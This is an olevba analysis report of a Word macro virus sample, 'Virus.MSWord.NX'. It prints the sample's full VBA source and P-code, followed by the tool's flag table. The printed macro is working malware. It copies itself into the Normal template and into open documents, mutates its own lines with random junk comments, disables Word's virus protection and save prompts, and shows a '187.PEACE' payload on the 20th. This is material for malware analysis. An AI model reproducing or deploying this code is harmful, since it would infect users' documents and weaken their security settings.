olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NX
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NX - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub A187() ''
'³Ριψ«¬ξ«ΞµΗ�Πο�Θφ°ΉΞίκΝ©ϋΚΣίΟέΕΝτθέΙΞΝ«Ί»ϋ
Dim doc1i As Boolean, doc2i As Boolean ''
'τΜαΩ®ΩΤχ±¬§³φ©¦»ΌχΛμ©©ΐ―ώΈ�©ΏκΉ
doc1i = True: doc2i = True ''
ID = "Private Sub A187() ''" ''
'ΪήΦώ¶νφµ
Set doc1 = NormalTemplate.VBProject.VBComponents(1): Set doc2 = ActiveDocument.VBProject.VBComponents(1) ''
Set h = VBE.ActiveVBProject.VBComponents(1) ''
'ΉώΜΠΟµξΉΖρΟ¨ΔΛ§ΈϋςΫή§ΞµΣΒΤξσΉγΦμχ§�ΘΡϊ―ΥθηθΗηύ²Υ¦ΰΒ®θύΫΖΟ¥γΒ
If doc1.CodeModule.Lines(1, 1) <> ID Then doc1i = False ''
If doc2.CodeModule.Lines(1, 1) <> ID Then doc2i = False ''
'�ΖΟςεωΝέ¨λ·Ώ¥λΌηέρ¬ύ�«ΩθΉίΓγΜΨΫΤη¦§κΊΥ―Α
scr = h.CodeModule.Lines(1, h.CodeModule.CountOfLines) ''
'γώ¶υ¶¶ΕσΦϋΌΐΫΤ³άΣ«ΝθρΨ―ωΗΛχ²άξ»Ζ¬ξς
If doc1i = False Then ''
doc1.CodeModule.AddFromString scr ''
End If ''
If doc2i = False Then ''
'―εμηψίΰσ�Δ©¥�Ό½³ΓέΔ¶¶ϊΙαΣΖιάΤήκνόώΡ¬Ψέώ΄Β§ΞΙΝ©――«έηπνΛ―Έψ
doc2.CodeModule.AddFromString scr ''
'σΏµΒΧβΔΦΛµΎΉθχνΏΙ°ΓψΥΘΕ°πΣΰύζ¶ΐη΄ΟΖΩΐτΝ΄μΗςύψ�ΰΑΡΒΔ®ΙΩΕΜ¦ήΑψ»ήώΰ
End If ''
For i = 1 To doc1.CodeModule.CountOfLines ''
lin = doc1.CodeModule.Lines(i, 1) ''
'κΦθπΩ®
com = "" ''
For t = 1 To (70 * Rnd) ''
'°ΏΓίΊΠ¥κΉ·ΩΦ²Μάώσμγ¬ΞΏ·ΐΒοφ�ΈΘΈκο®ΏζΉτιβ«όΑΊΡµ�ϊκρ½΄λΦθ
com = com + Chr(255 - (90 * Rnd)) ''
Next t ''
If Right(lin, 2) <> "''" Then ''
'Δ®ϊί³υγςω¥γΡξλωοΘ�νσ¬ΒμΔ®ΧτΟΔπκΓρεθΎ°ΑΘιΉ¶ύ―Σωΰ®ΉΦΗ«θΤΦϊβιΠ¦ή®ΤΖ
doc1.CodeModule.ReplaceLine i, "'" + com ''
End If ''
'Ν¶Γ�Τ§ΔΈΌόοάΉΉΑ°ΫΈκΉΤΜςΜΈ¶υΌξόΧ¦§ήΜΛΚΖ
Next i ''
For y = 1 To doc2.CodeModule.CountOfLines ''
lin = doc2.CodeModule.Lines(y, 1) ''
com = "" ''
For t = 1 To (70 * Rnd) ''
com = com + Chr(255 - (90 * Rnd)) ''
'Ϋψ§τς¬ΧόΉξΣΕ�¬ΈΡηάΰνΫΓΊΨ
Next t ''
'ρόΜΒΑαδ―ϋΥΡΕ³οδΎΣ
If Right(lin, 2) <> "''" Then ''
doc2.CodeModule.ReplaceLine y, "'" + com ''
End If ''
Next y ''
End Sub ''
'ΐ±³ρΩηλΛ»Β©Β»ύυ±ΥλΊΦΰ§Λύ±­ΡκΧ²®ΒΝΨΔρς­µχλιΰι΄
Private Sub Document_New(): A187: End Sub ''
Private Sub Document_Open(): A187: Options.VirusProtection = (Rnd): Options.SaveNormalPrompt = (Rnd): Application.EnableCancelKey = wdCancelDisabled: End Sub ''
'ΔΒυΈΞ΄ΤΣζά·¶½όχ�μριΑ¬�τΖΗύ³ΌΕφΩ±ϊ²Ρ»χµΛ―«³πΧΛνΤΙχώι�ϊ²»Κ
Private Sub Document_Close(): A187: P187: End Sub ''
Private Sub P187() ''
'κφ¨ξΡθµ�ΣΌηϋσηΛΎ�λ³Έ¦©ΰΩ±ξιθψΎΪΐ
If Day(Now) = 20 Then ''
Application.Caption = "Who am I?Where am I going?-187.PEACE" ''
'τσύΉΐυλώ»«υΘΨΐΕΌϊύβ�ΖΦΈΠ
Application.Height = 187 ''
'ώΛΘΞϊθΤΡΐ¬±ΫυΏΏΥί«έΐλµ�κμΧοµΈ¬ΰ»«®Ϋ°―λυ§π®Όδ΄βΥά�ΐ§λΗΌΩΤΤΓΥυΦΰ·λωµ
Application.Width = 187 ''
Application.Move 187, 187 ''
'­θµι»έΎ¬¶σ―ά΄υφΚ
MsgBox "187.PEACE", vbSystemModal, "Deo to Peace" ''
'λμγδξ²ψνσΰ΄Υ¬ΧέΞ¶ΏφψέΕΞλ¶χζχη³�ΛΗΛΛίΩ
Rem This Virus is dedicated to Peace(eirhnh) ''
'²ΗΊ
Rem Greetings to everyone int the scene ''
Rem Why? The 187 Family! ''
'ΉδέΥΖΤ²ξεβυδΞύ―ΕΑθΫΔζ©κΕτξΦΧΙΪϊρρ±Ξβϋή²πΰπΠκεκ¦πΒΗβ²»ηχΑ
End If ''
'ι
End Sub ''
Private Sub ShowVBCode(): End Sub ''
'ό¥κϊ
'Υλπ�μδεΑ·ζή½ρ
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NX
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7819 bytes
' Line #0:
' 	FuncDefn (Private Sub A187())
' 	QuoteRem 0x0013 0x0001 "'"
' Line #1:
' 	QuoteRem 0x0000 0x002A "³Ριψ«¬ξ«ΞµΗ�Πο�Θφ°ΉΞίκΝ©ϋΚΣίΟέΕΝτθέΙΞΝ«Ί»ϋ"
' Line #2:
' 	Dim 
' 	VarDefn doc1i (As Boolean)
' 	VarDefn doc2i (As Boolean)
' 	QuoteRem 0x0027 0x0001 "'"
' Line #3:
' 	QuoteRem 0x0000 0x001F "τΜαΩ®ΩΤχ±¬§³φ©¦»ΌχΛμ©©ΐ―ώΈ�©ΏκΉ"
' Line #4:
' 	LitVarSpecial (True)
' 	St doc1i 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St doc2i 
' 	QuoteRem 0x001B 0x0001 "'"
' Line #5:
' 	LitStr 0x0015 "Private Sub A187() ''"
' 	St ID 
' 	QuoteRem 0x001D 0x0001 "'"
' Line #6:
' 	QuoteRem 0x0000 0x0008 "ΪήΦώ¶νφµ"
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set doc1 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set doc2 
' 	QuoteRem 0x0069 0x0001 "'"
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set h 
' 	QuoteRem 0x002C 0x0001 "'"
' Line #9:
' 	QuoteRem 0x0000 0x003C "ΉώΜΠΟµξΉΖρΟ¨ΔΛ§ΈϋςΫή§ΞµΣΒΤξσΉγΦμχ§�ΘΡϊ―ΥθηθΗηύ²Υ¦ΰΒ®θύΫΖΟ¥γΒ"
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld doc1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ID 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St doc1i 
' 	EndIf 
' 	QuoteRem 0x0038 0x0001 "'"
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld doc2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ID 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St doc2i 
' 	EndIf 
' 	QuoteRem 0x0038 0x0001 "'"
' Line #12:
' 	QuoteRem 0x0000 0x0028 "�ΖΟςεωΝέ¨λ·Ώ¥λΌηέρ¬ύ�«ΩθΉίΓγΜΨΫΤη¦§κΊΥ―Α"
' Line #13:
' 	LitDI2 0x0001 
' 	Ld h 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld h 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St scr 
' 	QuoteRem 0x0037 0x0001 "'"
' Line #14:
' 	QuoteRem 0x0000 0x0023 "γώ¶υ¶¶ΕσΦϋΌΐΫΤ³άΣ«ΝθρΨ―ωΗΛχ²άξ»Ζ¬ξς"
' Line #15:
' 	Ld doc1i 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0016 0x0001 "'"
' Line #16:
' 	Ld scr 
' 	Ld doc1 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #17:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #18:
' 	Ld doc2i 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0016 0x0001 "'"
' Line #19:
' 	QuoteRem 0x0000 0x0039 "―εμηψίΰσ�Δ©¥�Ό½³ΓέΔ¶¶ϊΙαΣΖιάΤήκνόώΡ¬Ψέώ΄Β§ΞΙΝ©――«έηπνΛ―Έψ"
' Line #20:
' 	Ld scr 
' 	Ld doc2 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #21:
' 	QuoteRem 0x0000 0x0040 "σΏµΒΧβΔΦΛµΎΉθχνΏΙ°ΓψΥΘΕ°πΣΰύζ¶ΐη΄ΟΖΩΐτΝ΄μΗςύψ�ΰΑΡΒΔ®ΙΩΕΜ¦ήΑψ»ήώΰ"
' Line #22:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld doc1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	QuoteRem 0x002A 0x0001 "'"
' Line #24:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld doc1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #25:
' 	QuoteRem 0x0000 0x0006 "κΦθπΩ®"
' Line #26:
' 	LitStr 0x0000 ""
' 	St com 
' 	QuoteRem 0x0009 0x0001 "'"
' Line #27:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0046 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	For 
' 	QuoteRem 0x0018 0x0001 "'"
' Line #28:
' 	QuoteRem 0x0000 0x0037 "°ΏΓίΊΠ¥κΉ·ΩΦ²Μάώσμγ¬ΞΏ·ΐΒοφ�ΈΘΈκο®ΏζΉτιβ«όΑΊΡµ�ϊκρ½΄λΦθ"
' Line #29:
' 	Ld com 
' 	LitDI2 0x00FF 
' 	LitDI2 0x005A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St com 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #30:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #31:
' 	Ld lin 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0002 "''"
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x001E 0x0001 "'"
' Line #32:
' 	QuoteRem 0x0000 0x0040 "Δ®ϊί³υγςω¥γΡξλωοΘ�νσ¬ΒμΔ®ΧτΟΔπκΓρεθΎ°ΑΘιΉ¶ύ―Σωΰ®ΉΦΗ«θΤΦϊβιΠ¦ή®ΤΖ"
' Line #33:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld com 
' 	Add 
' 	Ld doc1 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	QuoteRem 0x0029 0x0001 "'"
' Line #34:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #35:
' 	QuoteRem 0x0000 0x0026 "Ν¶Γ�Τ§ΔΈΌόοάΉΉΑ°ΫΈκΉΤΜςΜΈ¶υΌξόΧ¦§ήΜΛΚΖ"
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #37:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld doc2 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	QuoteRem 0x002A 0x0001 "'"
' Line #38:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Ld doc2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #39:
' 	LitStr 0x0000 ""
' 	St com 
' 	QuoteRem 0x0009 0x0001 "'"
' Line #40:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0046 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	For 
' 	QuoteRem 0x0018 0x0001 "'"
' Line #41:
' 	Ld com 
' 	LitDI2 0x00FF 
' 	LitDI2 0x005A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St com 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #42:
' 	QuoteRem 0x0000 0x0018 "Ϋψ§τς¬ΧόΉξΣΕ�¬ΈΡηάΰνΫΓΊΨ"
' Line #43:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #44:
' 	QuoteRem 0x0000 0x0011 "ρόΜΒΑαδ―ϋΥΡΕ³οδΎΣ"
' Line #45:
' 	Ld lin 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0002 "''"
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x001E 0x0001 "'"
' Line #46:
' 	Ld y 
' 	LitStr 0x0001 "'"
' 	Ld com 
' 	Add 
' 	Ld doc2 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	QuoteRem 0x0029 0x0001 "'"
' Line #47:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #48:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #49:
' 	EndSub 
' 	QuoteRem 0x0008 0x0001 "'"
' Line #50:
' 	QuoteRem 0x0000 0x002D "ΐ±³ρΩηλΛ»Β©Β»ύυ±ΥλΊΦΰ§Λύ±­ΡκΧ²®ΒΝΨΔρς­µχλιΰι΄"
' Line #51:
' 	FuncDefn (Private Sub Document_New())
' 	BoS 0x0000 
' 	ArgsCall A187 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x002A 0x0001 "'"
' Line #52:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall A187 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x009E 0x0001 "'"
' Line #53:
' 	QuoteRem 0x0000 0x0038 "ΔΒυΈΞ΄ΤΣζά·¶½όχ�μριΑ¬�τΖΗύ³ΌΕφΩ±ϊ²Ρ»χµΛ―«³πΧΛνΤΙχώι�ϊ²»Κ"
' Line #54:
' 	FuncDefn (Private Sub Document_Close())
' 	BoS 0x0000 
' 	ArgsCall A187 0x0000 
' 	BoS 0x0000 
' 	ArgsCall P187 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0032 0x0001 "'"
' Line #55:
' 	FuncDefn (Private Sub P187())
' 	QuoteRem 0x0013 0x0001 "'"
' Line #56:
' 	QuoteRem 0x0000 0x0020 "κφ¨ξΡθµ�ΣΌηϋσηΛΎ�λ³Έ¦©ΰΩ±ξιθψΎΪΐ"
' Line #57:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0016 0x0001 "'"
' Line #58:
' 	LitStr 0x0024 "Who am I?Where am I going?-187.PEACE"
' 	Ld Application 
' 	MemSt Caption 
' 	QuoteRem 0x003D 0x0001 "'"
' Line #59:
' 	QuoteRem 0x0000 0x0018 "τσύΉΐυλώ»«υΘΨΐΕΌϊύβ�ΖΦΈΠ"
' Line #60:
' 	LitDI2 0x00BB 
' 	Ld Application 
' 	MemSt Height 
' 	QuoteRem 0x0019 0x0001 "'"
' Line #61:
' 	QuoteRem 0x0000 0x0042 "ώΛΘΞϊθΤΡΐ¬±ΫυΏΏΥί«έΐλµ�κμΧοµΈ¬ΰ»«®Ϋ°―λυ§π®Όδ΄βΥά�ΐ§λΗΌΩΤΤΓΥυΦΰ·λωµ"
' Line #62:
' 	LitDI2 0x00BB 
' 	Ld Application 
' 	MemSt With 
' 	QuoteRem 0x0018 0x0001 "'"
' Line #63:
' 	LitDI2 0x00BB 
' 	LitDI2 0x00BB 
' 	Ld Application 
' 	ArgsMemCall Move 0x0002 
' 	QuoteRem 0x001A 0x0001 "'"
' Line #64:
' 	QuoteRem 0x0000 0x0010 "­θµι»έΎ¬¶σ―ά΄υφΚ"
' Line #65:
' 	LitStr 0x0009 "187.PEACE"
' 	Ld vbSystemModal 
' 	LitStr 0x000C "Deo to Peace"
' 	ArgsCall MsgBox 0x0003 
' 	QuoteRem 0x0032 0x0001 "'"
' Line #66:
' 	QuoteRem 0x0000 0x0025 "λμγδξ²ψνσΰ΄Υ¬ΧέΞ¶ΏφψέΕΞλ¶χζχη³�ΛΗΛΛίΩ"
' Line #67:
' 	Rem 0x002C " This Virus is dedicated to Peace(eirhnh) ''"
' Line #68:
' 	QuoteRem 0x0000 0x0003 "²ΗΊ"
' Line #69:
' 	Rem 0x0027 " Greetings to everyone int the scene ''"
' Line #70:
' 	Rem 0x0018 " Why? The 187 Family! ''"
' Line #71:
' 	QuoteRem 0x0000 0x0038 "ΉδέΥΖΤ²ξεβυδΞύ―ΕΑθΫΔζ©κΕτξΦΧΙΪϊρρ±Ξβϋή²πΰπΠκεκ¦πΒΗβ²»ηχΑ"
' Line #72:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0001 "'"
' Line #73:
' 	QuoteRem 0x0000 0x0001 "ι"
' Line #74:
' 	EndSub 
' 	QuoteRem 0x0008 0x0001 "'"
' Line #75:
' 	FuncDefn (Private Sub ShowVBCode())
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0022 0x0001 "'"
' Line #76:
' 	QuoteRem 0x0000 0x0004 "ό¥κϊ"
' Line #77:
' 	QuoteRem 0x0000 0x000D "Υλπ�μδεΑ·ζή½ρ"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

